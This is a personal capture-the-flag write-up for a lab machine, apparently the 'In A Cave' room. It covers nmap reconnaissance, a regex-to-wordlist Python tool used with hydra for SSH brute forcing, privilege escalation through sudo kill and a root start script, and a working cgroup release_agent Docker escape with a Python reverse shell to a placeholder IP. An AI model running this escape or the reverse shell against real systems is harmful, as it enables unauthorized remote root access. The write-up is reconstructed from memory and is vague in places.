# In A Cave

Was exploring the application on the web.

## `nmap` scan

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-03 08:40 -0600
Nmap scan report for 10.48.189.50
Host is up (0.32s latency).
Not shown: 8377 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Document
2222/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 79:16:b1:ce:e1:16:79:b4:f1:c7:1f:09:05:b7:75:58 (RSA)
|   256 35:60:6e:3b:a8:ac:4a:6a:76:42:3d:59:13:04:90:19 (ECDSA)
|_  256 79:a6:05:ca:84:32:dc:59:b4:9b:8b:30:95:34:00:c8 (ED25519)
3333/tcp open  dec-notes?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, JavaRMI, NULL, RPCCheck, SMBProgNeg, X11Probe, kumo-server: 
|     You find yourself in a cave, what do you do?
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     You find yourself in a cave, what do you do?
|_    Nothing happens
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3333-TCP:V=7.98%I=7%D=7/3%Time=6A47C9F6%P=x86_64-pc-linux-gnu%r(NUL
SF:L,2D,"You\x20find\x20yourself\x20in\x20a\x20cave,\x20what\x20do\x20you\
SF:x20do\?\n")%r(GenericLines,3D,"You\x20find\x20yourself\x20in\x20a\x20ca
SF:ve,\x20what\x20do\x20you\x20do\?\nNothing\x20happens\n")%r(LPDString,3D
SF:,"You\x20find\x20yourself\x20in\x20a\x20cave,\x20what\x20do\x20you\x20d
SF:o\?\nNothing\x20happens\n")%r(JavaRMI,2D,"You\x20find\x20yourself\x20in
SF:\x20a\x20cave,\x20what\x20do\x20you\x20do\?\n")%r(kumo-server,2D,"You\x
SF:20find\x20yourself\x20in\x20a\x20cave,\x20what\x20do\x20you\x20do\?\n")
SF:%r(GetRequest,3D,"You\x20find\x20yourself\x20in\x20a\x20cave,\x20what\x
SF:20do\x20you\x20do\?\nNothing\x20happens\n")%r(HTTPOptions,3D,"You\x20fi
SF:nd\x20yourself\x20in\x20a\x20cave,\x20what\x20do\x20you\x20do\?\nNothin
SF:g\x20happens\n")%r(RTSPRequest,3D,"You\x20find\x20yourself\x20in\x20a\x
SF:20cave,\x20what\x20do\x20you\x20do\?\nNothing\x20happens\n")%r(RPCCheck
SF:,2D,"You\x20find\x20yourself\x20in\x20a\x20cave,\x20what\x20do\x20you\x
SF:20do\?\n")%r(DNSVersionBindReqTCP,2D,"You\x20find\x20yourself\x20in\x20
SF:a\x20cave,\x20what\x20do\x20you\x20do\?\n")%r(DNSStatusRequestTCP,2D,"Y
SF:ou\x20find\x20yourself\x20in\x20a\x20cave,\x20what\x20do\x20you\x20do\?
SF:\n")%r(Help,3D,"You\x20find\x20yourself\x20in\x20a\x20cave,\x20what\x20
SF:do\x20you\x20do\?\nNothing\x20happens\n")%r(SSLSessionReq,3D,"You\x20fi
SF:nd\x20yourself\x20in\x20a\x20cave,\x20what\x20do\x20you\x20do\?\nNothin
SF:g\x20happens\n")%r(TerminalServerCookie,3D,"You\x20find\x20yourself\x20
SF:in\x20a\x20cave,\x20what\x20do\x20you\x20do\?\nNothing\x20happens\n")%r
SF:(TLSSessionReq,3D,"You\x20find\x20yourself\x20in\x20a\x20cave,\x20what\
SF:x20do\x20you\x20do\?\nNothing\x20happens\n")%r(Kerberos,3D,"You\x20find
SF:\x20yourself\x20in\x20a\x20cave,\x20what\x20do\x20you\x20do\?\nNothing\
SF:x20happens\n")%r(SMBProgNeg,2D,"You\x20find\x20yourself\x20in\x20a\x20c
SF:ave,\x20what\x20do\x20you\x20do\?\n")%r(X11Probe,2D,"You\x20find\x20you
SF:rself\x20in\x20a\x20cave,\x20what\x20do\x20you\x20do\?\n")%r(FourOhFour
SF:Request,3D,"You\x20find\x20yourself\x20in\x20a\x20cave,\x20what\x20do\x
SF:20you\x20do\?\nNothing\x20happens\n");
Device type: general purpose|phone
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (96%), Google Android 10.X|11.X|12.X (93%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:google:android:10 cpe:/o:google:android:11 cpe:/o:google:android:12 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6
Aggressive OS guesses: Linux 4.15 - 5.19 (96%), Linux 4.15 (95%), Linux 5.4 (95%), Android 10 - 12 (Linux 4.14 - 4.19) (93%), Android 10 - 11 (Linux 4.14) (92%), Android 9 - 10 (Linux 4.9 - 4.14) (92%), Linux 2.6.32 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%), Linux 3.7 - 4.19 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   910.48 ms 192.168.128.1
2   ...
3   910.70 ms 10.48.189.50

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 108.97 seconds
```

My VM snapshot crashed and i lost all logs. Here are the local files I used as temp storage for it all.

## Here are some things I do remember

Also I used java_1.8.0_452 for generating XXE payload from frontend for reflective attack. Application uses 0_251 version but this also worked.

After XXE, at `action.php?<xml>[serialized-action-object]</xml> to gain initial access. For the first info.txt i got password regex, with which i created a wordlist using a tool I made myself(with Mr.Fable):

```python
#!/usr/bin/env python3
"""
regexpand - Expand regex patterns into all the concrete strings they can match.

Reads one regex pattern per line from a file (or stdin) and, for each finite
pattern, lists every string it can produce.

Supported constructs:
    literals            abc
    alternation         a|b|cat
    grouping            (ab|cd)   (?:ab|cd)
    optional            a?
    bounded repeat      a{2}  a{1,3}
    character class     [abc]  [a-f]  [0-9A-F]
    escapes             \\d \\w \\s (as finite sets), \\. \\( etc.
    anchors ^ $         ignored (stripped)

Unbounded quantifiers (* +) are rejected because they yield infinitely many
strings. Use --cap to bound the total expansion size per pattern.
"""

import argparse
import itertools
import string
import sys

CLASS_ESCAPES = {
    "d": [chr(c) for c in range(ord("0"), ord("9") + 1)],
    "w": list(string.ascii_letters + string.digits + "_"),
    "s": list(" \t\n\r\f\v"),
}


class RegexError(Exception):
    pass


class Parser:
    """Parse a finite regex into a tree; nodes yield lists of possible strings."""

    def __init__(self, pattern):
        self.s = pattern
        self.i = 0

    def peek(self):
        return self.s[self.i] if self.i < len(self.s) else None

    def next(self):
        c = self.s[self.i]
        self.i += 1
        return c

    def parse(self):
        node = self.parse_alt()
        if self.i != len(self.s):
            raise RegexError(f"unexpected character {self.peek()!r} at {self.i}")
        return node

    def parse_alt(self):
        options = [self.parse_seq()]
        while self.peek() == "|":
            self.next()
            options.append(self.parse_seq())
        if len(options) == 1:
            return options[0]
        return ("alt", options)

    def parse_seq(self):
        parts = []
        while self.peek() not in (None, "|", ")"):
            parts.append(self.parse_quant())
        return ("seq", parts)

    def parse_quant(self):
        atom = self.parse_atom()
        c = self.peek()
        if c == "?":
            self.next()
            return ("opt", atom)
        if c in ("*", "+"):
            raise RegexError(
                f"unbounded quantifier {c!r} produces infinite matches; "
                "use bounded {m,n} instead"
            )
        if c == "{":
            return self.parse_repeat(atom)
        return atom

    def parse_repeat(self, atom):
        self.next()  # consume {
        num = ""
        while self.peek() and self.peek().isdigit():
            num += self.next()
        lo = int(num) if num else 0
        hi = lo
        if self.peek() == ",":
            self.next()
            num2 = ""
            while self.peek() and self.peek().isdigit():
                num2 += self.next()
            if num2 == "":
                raise RegexError("unbounded {m,} produces infinite matches")
            hi = int(num2)
        if self.peek() != "}":
            raise RegexError("expected '}' in repeat")
        self.next()
        if hi < lo:
            raise RegexError(f"invalid repeat {{{lo},{hi}}}")
        return ("repeat", atom, lo, hi)

    def parse_atom(self):
        c = self.peek()
        if c is None:
            raise RegexError("unexpected end of pattern")
        if c == "(":
            self.next()
            if self.s[self.i:self.i + 2] == "?:":
                self.i += 2
            node = self.parse_alt()
            if self.peek() != ")":
                raise RegexError("missing ')'")
            self.next()
            return node
        if c == "[":
            return self.parse_class()
        if c in ("^", "$"):
            self.next()
            return ("seq", [])  # anchors: match empty
        if c == "\\":
            self.next()
            e = self.next()
            if e in CLASS_ESCAPES:
                return ("chars", CLASS_ESCAPES[e])
            return ("lit", e)
        if c in ")|":
            raise RegexError(f"unexpected {c!r}")
        self.next()
        return ("lit", c)

    def parse_class(self):
        self.next()  # [
        negate = False
        if self.peek() == "^":
            self.next()
            negate = True
        chars = []
        while self.peek() not in (None, "]"):
            c = self.next()
            if c == "\\":
                e = self.next()
                if e in CLASS_ESCAPES:
                    chars.extend(CLASS_ESCAPES[e])
                else:
                    chars.append(e)
                continue
            if self.peek() == "-" and self.s[self.i + 1:self.i + 2] not in ("", "]"):
                self.next()  # -
                end = self.next()
                chars.extend(chr(x) for x in range(ord(c), ord(end) + 1))
            else:
                chars.append(c)
        if self.peek() != "]":
            raise RegexError("missing ']'")
        self.next()
        if negate:
            printable = [chr(x) for x in range(32, 127)]
            chars = [ch for ch in printable if ch not in set(chars)]
        # dedupe, keep order
        seen = set()
        uniq = []
        for ch in chars:
            if ch not in seen:
                seen.add(ch)
                uniq.append(ch)
        return ("chars", uniq)


def expand(node):
    """Yield all strings a node can match."""
    kind = node[0]
    if kind == "lit":
        yield node[1]
    elif kind == "chars":
        yield from node[1]
    elif kind == "alt":
        for opt in node[1]:
            yield from expand(opt)
    elif kind == "seq":
        parts = node[1]
        if not parts:
            yield ""
            return
        for combo in itertools.product(*(list(expand(p)) for p in parts)):
            yield "".join(combo)
    elif kind == "opt":
        yield ""
        yield from expand(node[1])
    elif kind == "repeat":
        _, atom, lo, hi = node
        atom_opts = list(expand(atom))
        for count in range(lo, hi + 1):
            if count == 0:
                yield ""
                continue
            for combo in itertools.product(atom_opts, repeat=count):
                yield "".join(combo)
    else:
        raise RegexError(f"unknown node {kind}")


def expand_pattern(pattern, cap=None):
    tree = Parser(pattern).parse()
    out = []
    for s in expand(tree):
        out.append(s)
        if cap is not None and len(out) > cap:
            raise RegexError(f"expansion exceeds cap of {cap}")
    return out


def main(argv=None):
    ap = argparse.ArgumentParser(
        description="Expand regex patterns into all matching strings."
    )
    ap.add_argument(
        "file", nargs="?", default="-",
        help="file with one regex per line (default: stdin)",
    )
    ap.add_argument("-c", "--cap", type=int, default=10000,
                    help="max strings per pattern (default 10000)")
    ap.add_argument("--group", action="store_true",
                    help="print a header per pattern")
    ap.add_argument("-u", "--unique", action="store_true",
                    help="dedupe results across all patterns")
    args = ap.parse_args(argv)

    if args.file == "-":
        lines = sys.stdin.read().splitlines()
    else:
        with open(args.file, encoding="utf-8") as f:
            lines = f.read().splitlines()

    seen = set()
    had_error = False
    for lineno, raw in enumerate(lines, 1):
        pat = raw.strip()
        if not pat or pat.startswith("#"):
            continue
        try:
            results = expand_pattern(pat, cap=args.cap)
        except RegexError as e:
            print(f"error (line {lineno}) {pat!r}: {e}", file=sys.stderr)
            had_error = True
            continue
        if args.group:
            print(f"# {pat} -> {len(results)}")
        for s in results:
            if args.unique:
                if s in seen:
                    continue
                seen.add(s)
            print(s)

    return 1 if had_error else 0


if __name__ == "__main__":
    sys.exit(main())
```

Then `hydra` for getting `ssh` password for `cave` user.

Then got `info.txt` in `cave` users `~` : for one of the files which i read incorrectly with cat(due to an escape character) and was stuck on that for a while. [LINK](https://termack.github.io/thm_writeups/inacave.html) helped me in gettign unstuck... Got a password, didn't know it's use yet.

Found `oldman.gpg` in `cave` directory key but not the private key. I found some mentions of adventure.cave.thm in some file, but didn't know what to use it for. Mr.Fable helped me... made a `wget` request to it from TARGET only and got a index page with mention of `adventure.priv` there. So `wget adventure.cave.thm/adventure.priv` and used the file to decrypt, got the message which had reference to inventory item.

`INVENTORY=<item-name>` and then fired skeleton executable there. (found reference on using `lamp`). Got the password `spooky-skeleton` something like it.

Then `ssh` again using it for `skeleton` user. `sudo -l` and the user only had sudo access to `kill` command.

Made a recursive search for files which `skeleton` could use with full/partial access. Got mention of `/opt/link/startcon` which sym-links to `/root/start.sh`

It's definitely for docker(i have worked on two startups who used Java extensively and these apache server(similar stuff's there for nginx) calls seemed familiar), and hence appended my netcat listener reverse shellcode.

Found out that if you kill enough processes(forces a docker restart since health-check pings fail afterwards) it'll force a restart unless configured to something else(That's why the `sudo` access to `kill` command). Kept killing user processes, but only `kill <PID for /bin/bash>` worked.

Got root access but on docker machine. Then info.txt file with flags.

For escaping docker container i followed the exploits mentioned [here](https://infra.newerasec.com/infrastructure-testing/breakout/docker-escape), but modded it a bit.

```
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IPADDR>",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

Got another `info.txt` in `/root` with the last flag.
